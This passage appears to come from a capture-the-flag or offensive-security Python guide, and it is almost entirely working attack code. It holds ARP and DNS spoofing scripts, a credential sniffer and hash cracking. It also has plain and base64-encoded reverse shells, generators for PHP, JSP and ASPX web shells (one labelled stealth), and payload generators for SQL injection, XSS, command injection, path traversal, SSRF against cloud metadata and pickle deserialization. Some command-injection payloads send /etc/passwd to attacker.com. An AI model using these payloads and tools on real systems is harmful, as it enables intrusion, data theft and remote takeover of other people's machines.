print(f"Response from {addr}: {data}")

s.close()
```

**Raw socket (requires root)**:

```python
import socket
import struct

# Create raw socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

# Set IP header fields
source_ip = '10.10.10.50'
dest_ip = '10.10.10.100'

# IP header
ip_header = struct.pack('!BBHHHBBH4s4s',
    69,           # Version and IHL
    0,            # Type of Service
    40,           # Total Length
    54321,        # ID
    0,            # Flags and Fragment Offset
    64,           # TTL
    socket.IPPROTO_TCP,  # Protocol
    0,            # Checksum (kernel fills this)
    socket.inet_aton(source_ip),
    socket.inet_aton(dest_ip)
)

# TCP header
tcp_header = struct.pack('!HHLLBBHHH',
    12345,        # Source Port
    80,           # Dest Port
    0,            # Sequence Number
    0,            # Ack Number
    80,           # Data Offset and Reserved
    2,            # Flags (SYN)
    8192,         # Window
    0,            # Checksum
    0             # Urgent Pointer
)

packet = ip_header + tcp_header
s.sendto(packet, (dest_ip, 0))

s.close()
```

### Scapy for Packet Manipulation

**Basic packet crafting**:

```python
from scapy.all import *

# ICMP ping
packet = IP(dst="10.10.10.100")/ICMP()
response = sr1(packet, timeout=2)

if response:
    print(f"Host is up: {response.src}")
    response.show()
```

**TCP SYN scan**:

```python
from scapy.all import *

target = "10.10.10.100"
ports = [21, 22, 23, 80, 443, 3306, 8080]

for port in ports:
    # Create SYN packet
    packet = IP(dst=target)/TCP(dport=port, flags="S")
    
    # Send and receive response
    response = sr1(packet, timeout=1, verbose=0)
    
    if response:
        if response.haslayer(TCP):
            if response[TCP].flags == 0x12:  # SYN-ACK
                print(f"[+] Port {port}: OPEN")
                # Send RST to close connection
                rst = IP(dst=target)/TCP(dport=port, flags="R")
                send(rst, verbose=0)
            elif response[TCP].flags == 0x14:  # RST-ACK
                print(f"[-] Port {port}: CLOSED")
    else:
        print(f"[?] Port {port}: FILTERED")
```

**ARP spoofing**:

```python
from scapy.all import *
import time

target_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"

# Get MAC addresses
target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

print(f"[*] Target: {target_ip} ({target_mac})")
print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")

def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                 psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=5, verbose=False)

try:
    print("[*] Starting ARP spoofing...")
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Restoring ARP tables...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
```

**DNS spoofing**:

```python
from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # DNS query
        qname = pkt[DNS].qd.qname
        
        if b'target.com' in qname:
            print(f"[*] Spoofing DNS response for {qname.decode()}")
            
            # Create spoofed response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                         UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, 
                                     rdata='10.10.10.50'))
            
            send(spoofed_pkt, verbose=0)

print("[*] Starting DNS spoof...")
sniff(filter="udp port 53", prn=dns_spoof)
```

**Packet sniffing**:

```python
from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        
        # Check for credentials
        if b'password' in payload.lower() or b'user' in payload.lower():
            print(f"\n[+] Potential credentials:")
            print(f"    Source: {packet[IP].src}:{packet[TCP].sport}")
            print(f"    Dest: {packet[IP].dst}:{packet[TCP].dport}")
            print(f"    Payload: {payload[:200]}")

print("[*] Sniffing network traffic...")
sniff(prn=packet_callback, filter="tcp port 80 or tcp port 21 or tcp port 23", 
      store=0)
```

### File Operations

**Reading wordlists efficiently**:

```python
# Read entire file
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    passwords = f.read().splitlines()

# Read line by line (memory efficient)
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for password in f:
        password = password.strip()
        # Process password
```

**Writing results**:

```python
results = []

# Collect results
results.append({'username': 'admin', 'password': 'found123'})

# Write to file
with open('results.txt', 'w') as f:
    for result in results:
        f.write(f"{result['username']}:{result['password']}\n")

# Write JSON
import json
with open('results.json', 'w') as f:
    json.dump(results, f, indent=4)
```

**Binary file operations**:

```python
# Read binary file
with open('image.png', 'rb') as f:
    data = f.read()

# Search for magic bytes
if data.startswith(b'\x89PNG'):
    print("Valid PNG file")

# Extract embedded data
flag_start = data.find(b'flag{')
if flag_start != -1:
    flag_end = data.find(b'}', flag_start)
    flag = data[flag_start:flag_end+1]
    print(f"Found flag: {flag.decode()}")
```

### Encoding and Hashing

**Base64 operations**:

```python
import base64

# Encode
text = "admin:password"
encoded = base64.b64encode(text.encode()).decode()
print(f"Encoded: {encoded}")

# Decode
decoded = base64.b64decode(encoded).decode()
print(f"Decoded: {decoded}")

# URL-safe encoding
url_encoded = base64.urlsafe_b64encode(text.encode()).decode()
print(f"URL-safe: {url_encoded}")
```

**URL encoding**:

```python
from urllib.parse import quote, unquote, urlencode

# Encode special characters
text = "' OR '1'='1"
encoded = quote(text)
print(f"URL encoded: {encoded}")

# Decode
decoded = unquote(encoded)
print(f"URL decoded: {decoded}")

# Encode dictionary
params = {'id': "1' OR '1'='1", 'action': 'delete'}
encoded_params = urlencode(params)
print(f"Params: {encoded_params}")
```

**Hashing**:

```python
import hashlib

text = "password123"

# MD5
md5 = hashlib.md5(text.encode()).hexdigest()
print(f"MD5: {md5}")

# SHA-1
sha1 = hashlib.sha1(text.encode()).hexdigest()
print(f"SHA-1: {sha1}")

# SHA-256
sha256 = hashlib.sha256(text.encode()).hexdigest()
print(f"SHA-256: {sha256}")

# HMAC
import hmac
secret = "secret_key"
signature = hmac.new(secret.encode(), text.encode(), hashlib.sha256).hexdigest()
print(f"HMAC-SHA256: {signature}")
```

**Hash cracking**:

```python
import hashlib

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 of "password"

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        word = line.strip()
        word_hash = hashlib.md5(word.encode()).hexdigest()
        
        if word_hash == target_hash:
            print(f"[+] Hash cracked: {word}")
            break
```

### Command Execution

**Subprocess module**:

```python
import subprocess

# Run command
result = subprocess.run(['nmap', '-sV', '10.10.10.100'], 
                       capture_output=True, text=True)

print(result.stdout)
print(result.stderr)
print(f"Return code: {result.returncode}")

# Run with shell
result = subprocess.run('ls -la | grep root', shell=True, 
                       capture_output=True, text=True)
print(result.stdout)
```

**OS module**:

```python
import os

# Execute command
os.system('whoami')

# Get output
output = os.popen('cat /etc/passwd').read()
print(output)

# Environment variables
print(os.environ.get('PATH'))
```

## Custom Payload Generation

### Reverse Shell Payloads

**Python reverse shell**:

```python
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    
    subprocess.call(["/bin/sh", "-i"])

# Usage
reverse_shell('10.10.10.50', 4444)
```

**One-liner reverse shell**:

```python
# Generate one-liner
host = '10.10.10.50'
port = 4444

payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"

print(payload)
```

**Encoded reverse shell**:

```python
import base64

host = '10.10.10.50'
port = 4444

shell_code = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"""

encoded = base64.b64encode(shell_code.encode()).decode()

payload = f"python3 -c 'import base64,sys;exec(base64.b64decode(\"{encoded}\"))'"

print(payload)
```

### Web Shell Payloads

**PHP web shell generator**:

```python
def generate_php_shell(type='basic'):
    shells = {
        'basic': '<?php system($_GET["cmd"]); ?>',
        
        'extended': '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>''',
        
        'stealth': '''<?php
@error_reporting(0);
@ini_set('display_errors', 0);
$cmd = $_POST['x'];
if($cmd){
    echo shell_exec($cmd);
}
?>''',
        
        'upload': '''<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file" />
<input type="submit" value="Upload" />
</form>'''
    }
    
    return shells.get(type, shells['basic'])

# Generate shells
basic_shell = generate_php_shell('basic')
print(basic_shell)

# Save to file
with open('shell.php', 'w') as f:
    f.write(generate_php_shell('extended'))
```

**JSP web shell generator**:

```python
def generate_jsp_shell():
    shell = '''<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while((line = br.readLine()) != null){
            out.println(line + "<br>");
        }
    }
%>'''
    return shell

print(generate_jsp_shell())
```

**ASP.NET web shell generator**:

```python
def generate_aspx_shell():
    shell = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e){
        string cmd = Request.QueryString["cmd"];
        if(cmd != null){
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>'''
    return shell

print(generate_aspx_shell())
```

### SQL Injection Payloads

**Payload generator**:

```python
class SQLiPayloadGenerator:
    def __init__(self, dbms='mysql'):
        self.dbms = dbms
    
    def boolean_based(self, true_condition):
        payloads = {
            'mysql': [
                f"' AND {true_condition}-- -",
                f"' OR {true_condition}-- -",
                f"1' AND {true_condition} AND '1'='1",
            ],
            'mssql': [
                f"' AND {true_condition}--",
                f"'; IF({true_condition}) WAITFOR DELAY '00:00:05'--",
            ],
            'oracle': [
                f"' AND {true_condition}--",
                f"' AND {true_condition} AND '1'='1",
            ]
        }
        return payloads.get(self.dbms, payloads['mysql'])
    
    def union_based(self, columns):
        null_string = ','.join(['NULL'] * columns)
        
        payloads = {
            'mysql': [
                f"' UNION SELECT {null_string}-- -",
                f"' UNION ALL SELECT {null_string}-- -",
                f"-1' UNION SELECT {null_string}-- -",
            ],
            'mssql': [
                f"' UNION SELECT {null_string}--",
            ],
            'oracle': [
                f"' UNION SELECT {null_string} FROM dual--",
            ]
        }
        return payloads.get(self.dbms, payloads['mysql'])
    
    def time_based(self, seconds=5):
        payloads = {
            'mysql': [
                f"' AND SLEEP({seconds})-- -",
                f"'; SELECT SLEEP({seconds})-- -",
            ],
            'mssql': [
                f"'; WAITFOR DELAY '00:00:0{seconds}'--",
            ],
            'postgresql': [
                f"'; SELECT pg_sleep({seconds})--",
            ],
            'oracle': [
                f"' AND DBMS_LOCK.SLEEP({seconds})--",
            ]
        }
        return payloads.get(self.dbms, payloads['mysql'])
    
    def error_based(self):
        payloads = {
            'mysql': [
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)y)-- -",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
            ],
            'mssql': [
                "' AND 1=CONVERT(INT,(SELECT @@version))--",
            ]
        }
        return payloads.get(self.dbms, payloads['mysql'])

# Usage
gen = SQLiPayloadGenerator('mysql')

# Generate boolean payloads
for payload in gen.boolean_based("1=1"):
    print(payload)

# Generate UNION payloads
for payload in gen.union_based(5):
    print(payload)

# Generate time-based payloads
for payload in gen.time_based(5):
    print(payload)
```

### XSS Payloads

**XSS payload generator**:

```python
class XSSPayloadGenerator:
    def __init__(self):
        self.basic_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
        ]
    
    def generate_encoded(self, payload):
        import html
        from urllib.parse import quote
        
        encodings = {
            'html': html.escape(payload),
            'url': quote(payload),
            'double_url': quote(quote(payload)),
            'hex': ''.join([f'\\x{ord(c):02x}' for c in payload]),
        }
        return encodings
    
    def generate_obfuscated(self):
        obfuscated = [
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',  # alert(1)
            '<script>eval(atob("YWxlcnQoMSk="))</script>',  # base64: alert(1)
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',  # HTML entities
            '<svg/onload=alert`1`>',  # Template literals
        ]
        return obfuscated
    
    def generate_filter_bypass(self):
        bypass = [
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<SCRipT>alert(1)</sCRipT>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>',
        ]
        return bypass
    
    def generate_dom_xss(self):
        dom_payloads = [
            "javascript:alert(1)",
            "#<script>alert(1)</script>",
            "data:text/html,<script>alert(1)</script>",
            "javascript:eval('al'+'ert(1)')",
        ]
        return dom_payloads

# Usage
xss_gen = XSSPayloadGenerator()

print("=== Basic Payloads ===")
for payload in xss_gen.basic_payloads:
    print(payload)

print("\n=== Encoded Payloads ===")
encoded = xss_gen.generate_encoded('<script>alert(1)</script>')

for encoding_type, payload in encoded.items():
    print(f"{encoding_type}: {payload}")

print("\n=== Obfuscated Payloads ===")
for payload in xss_gen.generate_obfuscated():
    print(payload)

print("\n=== Filter Bypass Payloads ===")
for payload in xss_gen.generate_filter_bypass():
    print(payload)

print("\n=== DOM XSS Payloads ===")
for payload in xss_gen.generate_dom_xss():
    print(payload)
```

### Command Injection Payloads

**Command injection payload generator**:

```python
class CommandInjectionPayloadGenerator:
    def __init__(self, command='whoami'):
        self.command = command
    
    def unix_payloads(self):
        payloads = [
            f"; {self.command}",
            f"| {self.command}",
            f"|| {self.command}",
            f"& {self.command}",
            f"&& {self.command}",
            f"`{self.command}`",
            f"$({self.command})",
            f"\n{self.command}",
            f"\r{self.command}",
        ]
        return payloads
    
    def windows_payloads(self):
        payloads = [
            f"& {self.command}",
            f"&& {self.command}",
            f"| {self.command}",
            f"|| {self.command}",
            f"\n{self.command}",
            f"\r\n{self.command}",
        ]
        return payloads
    
    def blind_payloads(self, callback_domain='attacker.com'):
        blind = [
            f"; curl http://{callback_domain}/$(whoami)",
            f"; wget http://{callback_domain}/?data=$(cat /etc/passwd | base64)",
            f"; nslookup $(whoami).{callback_domain}",
            f"; ping -c 1 {callback_domain}",
            f"& timeout 5",  # Time-based detection
        ]
        return blind
    
    def encoded_payloads(self):
        import base64
        
        # Base64 encoded command
        encoded_cmd = base64.b64encode(self.command.encode()).decode()
        
        payloads = [
            f"; echo {encoded_cmd} | base64 -d | bash",
            f"; echo {encoded_cmd} | base64 -d | sh",
            f"| echo {encoded_cmd} | base64 -d | bash",
        ]
        return payloads
    
    def filter_bypass(self):
        bypass = [
            # Space bypass
            f";cat</etc/passwd",
            f";cat${IFS}/etc/passwd",
            f";cat$IFS/etc/passwd",
            f";{cat,/etc/passwd}",
            
            # Slash bypass
            f";cat /et?/passw?",
            f";cat /e*c/p*wd",
            
            # Keyword bypass
            f";w'h'o'a'm'i",
            f";w\"h\"o\"a\"m\"i",
            f";who$@ami",
            f";who\\ami",
        ]
        return bypass

# Usage
cmd_gen = CommandInjectionPayloadGenerator('id')

print("=== Unix Payloads ===")
for payload in cmd_gen.unix_payloads():
    print(payload)

print("\n=== Windows Payloads ===")
for payload in cmd_gen.windows_payloads():
    print(payload)

print("\n=== Blind Payloads ===")
for payload in cmd_gen.blind_payloads():
    print(payload)

print("\n=== Encoded Payloads ===")
for payload in cmd_gen.encoded_payloads():
    print(payload)

print("\n=== Filter Bypass ===")
for payload in cmd_gen.filter_bypass():
    print(payload)
```

### Path Traversal Payloads

**Directory traversal generator**:

```python
class PathTraversalPayloadGenerator:
    def __init__(self, target_file='/etc/passwd'):
        self.target_file = target_file
    
    def basic_payloads(self):
        payloads = []
        
        # Basic traversal
        for depth in range(1, 10):
            prefix = '../' * depth
            payloads.append(f"{prefix}{self.target_file}")
            payloads.append(f"{prefix}{self.target_file.lstrip('/')}")
        
        return payloads
    
    def encoded_payloads(self):
        from urllib.parse import quote
        
        payloads = []
        basic = f"../../../../{self.target_file}"
        
        # URL encoding
        payloads.append(quote(basic))
        
        # Double URL encoding
        payloads.append(quote(quote(basic)))
        
        # UTF-8 encoding
        payloads.append(basic.replace('/', '%2f'))
        payloads.append(basic.replace('/', '%252f'))
        
        # Unicode encoding
        payloads.append(basic.replace('/', '%c0%af'))
        payloads.append(basic.replace('/', '%e0%80%af'))
        
        return payloads
    
    def bypass_payloads(self):
        payloads = [
            # Null byte injection (older PHP)
            f"../../../../{self.target_file}%00",
            f"../../../../{self.target_file}%00.jpg",
            
            # Dot bypass
            f"..././..././..././..././{self.target_file}",
            f"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..{self.target_file}",
            
            # Backslash (Windows)
            f"..\\..\\..\\..\\{self.target_file}",
            
            # Mixed slashes
            f"..\\../..\\../..\\../{self.target_file}",
            
            # Absolute path
            self.target_file,
            f"file://{self.target_file}",
            
            # Current directory bypass
            f"./././{self.target_file}",
            f"./{self.target_file}",
        ]
        return payloads
    
    def windows_payloads(self):
        payloads = []
        windows_files = [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
        ]
        
        for target in windows_files:
            for depth in range(1, 10):
                prefix = '..\\' * depth
                payloads.append(f"{prefix}{target}")
        
        return payloads

# Usage
path_gen = PathTraversalPayloadGenerator('/etc/passwd')

print("=== Basic Payloads ===")
for payload in path_gen.basic_payloads()[:5]:  # Show first 5
    print(payload)

print("\n=== Encoded Payloads ===")
for payload in path_gen.encoded_payloads():
    print(payload)

print("\n=== Bypass Payloads ===")
for payload in path_gen.bypass_payloads():
    print(payload)
```

### SSRF Payloads

**SSRF payload generator**:

```python
class SSRFPayloadGenerator:
    def __init__(self, internal_target='127.0.0.1'):
        self.target = internal_target
    
    def basic_payloads(self):
        payloads = [
            f"http://{self.target}",
            f"http://{self.target}:80",
            f"http://{self.target}:22",
            f"http://{self.target}:3306",
            f"http://{self.target}:6379",
            f"http://{self.target}:8080",
        ]
        return payloads
    
    def localhost_bypass(self):
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://0",
            "http://[::1]",
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # Decimal IP
            "http://0x7f000001",  # Hex IP
            "http://0177.0000.0000.0001",  # Octal IP
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
        ]
        return payloads
    
    def cloud_metadata(self):
        metadata = {
            'aws': [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/",
            ],
            'gcp': [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/",
            ],
            'azure': [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ],
            'digitalocean': [
                "http://169.254.169.254/metadata/v1/",
            ]
        }
        return metadata
    
    def protocol_bypass(self):
        payloads = [
            f"file:///etc/passwd",
            f"file:///c:/windows/win.ini",
            f"dict://{self.target}:6379/INFO",
            f"gopher://{self.target}:6379/_INFO",
            f"ldap://{self.target}:389",
            f"tftp://{self.target}:69/file",
        ]
        return payloads
    
    def url_bypass(self):
        payloads = [
            f"http://evil.com@{self.target}",
            f"http://{self.target}@evil.com",
            f"http://evil.com#{self.target}",
            f"http://evil.com?{self.target}",
            f"http://[::ffff:{self.target}]",
        ]
        return payloads

# Usage
ssrf_gen = SSRFPayloadGenerator('192.168.1.100')

print("=== Basic Payloads ===")
for payload in ssrf_gen.basic_payloads():
    print(payload)

print("\n=== Localhost Bypass ===")
for payload in ssrf_gen.localhost_bypass():
    print(payload)

print("\n=== Cloud Metadata ===")
for cloud, urls in ssrf_gen.cloud_metadata().items():
    print(f"\n{cloud.upper()}:")
    for url in urls:
        print(f"  {url}")

print("\n=== Protocol Bypass ===")
for payload in ssrf_gen.protocol_bypass():
    print(payload)
```

### Serialization Payloads

**Python pickle payload generator**:

```python
import pickle
import base64
import os

class PicklePayloadGenerator:
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, ('id',))
    
    @staticmethod
    def generate_command(cmd):
        class Exploit:
            def __reduce__(self):
                import os
                return (os.system, (cmd,))
        
        payload = pickle.dumps(Exploit())
        return base64.b64encode(payload).decode()
    
    @staticmethod
    def generate_reverse_shell(host, port):
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        
        return PicklePayloadGenerator.generate_command(cmd)

# Usage
print("=== Pickle RCE Payload ===")
payload = PicklePayloadGenerator.generate_command('whoami')
print(f"Base64 encoded: {payload}")

print("\n=== Reverse Shell Payload ===")
rev_shell = PicklePayloadGenerator.generate_reverse_shell('10.10.10.50', 4444)
print(f"Base64 encoded: {rev_shell}")
```

**PHP unserialize payload generator**:

```python
class PHPUnserializePayloadGenerator:
    @staticmethod
    def generate_basic():
        # Basic object injection
        payloads = [
            'O:8:"stdClass":1:{s:4:"test";s:5:"value";}',
            'a:1:{i:0;s:4:"test";}',  # Array
        ]
        return payloads
    
    @staticmethod
    def generate_phar():
        """
        Generate PHAR deserialization payload
        Note: Requires actual PHAR file creation
        """
        phar_stub = '''<?php
class Exploit {
    public function __destruct() {
        system($_GET['cmd']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>'''
        return phar_stub
    
    @staticmethod
    def generate_magic_method():
        """
        Payload exploiting PHP magic methods
        """
        payload = '''O:7:"Exploit":1:{s:4:"data";s:10:"phpinfo();"}'''
        return payload

# Usage
php_gen = PHPUnserializePayloadGenerator()

print("=== Basic Payloads ===")
for payload in php_gen.generate_basic():
    print(payload)

print("\n=== PHAR Generation Code ===")
print(php_gen.generate_phar())
```

### Polyglot Payloads

**Multi-context payload generator**:

```python
class PolyglotPayloadGenerator:
    @staticmethod
    def generate_xss_sqli():
        """
        Works as both XSS and SQLi
        """
        payloads = [
            "'-alert(1)-'",
            "'><script>alert(1)</script>",
            "' OR 1=1 UNION SELECT '<script>alert(1)</script>'-- -",
        ]
        return payloads
    
    @staticmethod
    def generate_file_polyglot():
        """
        File that is valid in multiple formats
        """
        polyglot = '''GIF89a/*<?php system($_GET['cmd']); ?>*/
<script>alert(1)</script>'''
        return polyglot
    
    @staticmethod
    def generate_comment_polyglot():
        """
        Valid across multiple languages
        """
        polyglot = '''#!/usr/bin/env python
#/*<?php
print("Hello from Python")
#*/
#system($_GET['cmd']);
#?>
'''
        return polyglot

# Usage
poly_gen = PolyglotPayloadGenerator()

print("=== XSS/SQLi Polyglot ===")
for payload in poly_gen.generate_xss_sqli():
    print(payload)

print("\n=== File Polyglot ===")
print(poly_gen.generate_file_polyglot())
```

### Automated Payload Testing

**Payload testing framework**:

```python
import requests
import time

class PayloadTester:
    def __init__(self, url, param, success_indicators):
        self.url = url
        self.param = param
        self.success_indicators = success_indicators
        self.successful_payloads = []
    
    def test_payload(self, payload):
        try:
            params = {self.param: payload}
            response = requests.get(self.url, params=params, timeout=10)
            
            # Check for success indicators
            for indicator in self.success_indicators:
                if indicator in response.text:
                    return True, response
            
            # Check status code
            if response.status_code == 200:
                return None, response  # Unclear
            
            return False, response
        
        except requests.exceptions.Timeout:
            # Might indicate time-based attack success
            return 'timeout', None
        except Exception as e:
            return False, None
    
    def test_payloads(self, payloads, delay=0.5):
        print(f"[*] Testing {len(payloads)} payloads against {self.url}")
        
        for i, payload in enumerate(payloads):
            print(f"[{i+1}/{len(payloads)}] Testing: {payload[:50]}...", end=' ')
            
            result, response = self.test_payload(payload)
            
            if result == True:
                print("✓ SUCCESS")
                self.successful_payloads.append({
                    'payload': payload,
                    'response': response.text[:200]
                })
            elif result == 'timeout':
                print("⏱ TIMEOUT (possible time-based)")
                self.successful_payloads.append({
                    'payload': payload,
                    'response': 'Timeout - possible time-based vulnerability'
                })
            else:
                print("✗ Failed")
            
            time.sleep(delay)
        
        return self.successful_payloads
    
    def report(self):
        if self.successful_payloads:
            print(f"\n[+] Found {len(self.successful_payloads)} successful payloads:")
            for item in self.successful_payloads:
                print(f"\nPayload: {item['payload']}")
                print(f"Response: {item['response']}")
        else:
            print("\n[-] No successful payloads found")

# Usage example
url = 'http://target.com/search.php'
param = 'q'
success_indicators = ['<script>', 'syntax error', 'mysql', 'root:']

tester = PayloadTester(url, param, success_indicators)

# Generate and test SQLi payloads
sqli_gen = SQLiPayloadGenerator('mysql')
payloads = sqli_gen.boolean_based("1=1")

results = tester.test_payloads(payloads)
tester.report()
```

### Payload Encoding Utilities

**Multi-encoding utility**:

```python
import base64
import urllib.parse
import html

class PayloadEncoder:
    @staticmethod
    def url_encode(payload, double=False):
        encoded = urllib.parse.quote(payload)
        if double:
            encoded = urllib.parse.quote(encoded)
        return encoded
    
    @staticmethod
    def html_encode(payload, decimal=True):
        if decimal:
            return ''.join([f'&#{ord(c)};' for c in payload])
        else:
            return ''.join([f'&#x{ord(c):x};' for c in payload])
    
    @staticmethod
    def base64_encode(payload):
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload):
        return ''.join([f'\\x{ord(c):02x}' for c in payload])
    
    @staticmethod
    def unicode_encode(payload):
        return ''.join([f'\\u{ord(c):04x}' for c in payload])
    
    @staticmethod
    def encode_all(payload):
        return {
            'original': payload,
            'url': PayloadEncoder.url_encode(payload),
            'url_double': PayloadEncoder.url_encode(payload, double=True),
            'html_decimal': PayloadEncoder.html_encode(payload, decimal=True),
            'html_hex': PayloadEncoder.html_encode(payload, decimal=False),
            'base64': PayloadEncoder.base64_encode(payload),
            'hex': PayloadEncoder.hex_encode(payload),
            'unicode': PayloadEncoder.unicode_encode(payload),
        }

# Usage
payload = "<script>alert(1)</script>"
encoded = PayloadEncoder.encode_all(payload)

for encoding_type, result in encoded.items():
    print(f"{encoding_type}: {result}")
```

### Complete Exploitation Script Template

**Full exploitation framework**:

```python
#!/usr/bin/env python3
import requests
import argparse
import sys
from urllib.parse import urljoin

class Exploiter:
    def __init__(self, target_url, verbose=False):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
    
    def log(self, message, level='info'):
        if self.verbose or level == 'success':
            prefix = {
                'info': '[*]',
                'success': '[+]',
                'error': '[-]',
                'debug': '[DEBUG]'
            }.get(level, '[*]')
            print(f"{prefix} {message}")
    
    def check_vulnerable(self):
        """Check if target is vulnerable"""
        self.log("Checking if target is vulnerable...")
        
        test_payload = "' OR '1'='1"
        params = {'id': test_payload}
        
        try:
            response = self.session.get(self.target_url, params=params)
            
            if 'syntax error' in response.text.lower() or \
               'mysql' in response.text.lower():
                self.log("Target appears vulnerable to SQLi!", 'success')
                return True
        except Exception as e:
            self.log(f"Error during check: {e}", 'error')
        
        return False
    
    def exploit(self):
        """Main exploitation logic"""
        if not self.check_vulnerable():
            self.log("Target does not appear vulnerable", 'error')
            return False
        
        self.log("Attempting exploitation...")
        
        # Add your exploitation logic here
        payload = "1' UNION SELECT NULL,username,password FROM users-- -"
        params = {'id': payload}
        
        try:
            response = self.session.get(self.target_url, params=params)
            
            # Parse response for data
            # This is where you'd extract the results
            
            self.log("Exploitation successful!", 'success')
            return True
        
        except Exception as e:
            self.log(f"Exploitation failed: {e}", 'error')
            return False

def main():
    parser = argparse.ArgumentParser(description='CTF Exploitation Script')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='Verbose output')
    parser.add_argument('-p', '--proxy', 
                       help='Proxy URL (e.g., http://127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    # Configure proxy if specified
    if args.proxy:
        import urllib3
        urllib3.disable_warnings()
        requests.packages.urllib3.disable_warnings()
    
    exploiter = Exploiter(args.url, verbose=args.verbose)
    
    if exploiter.exploit():
        sys.exit(0)
    else:
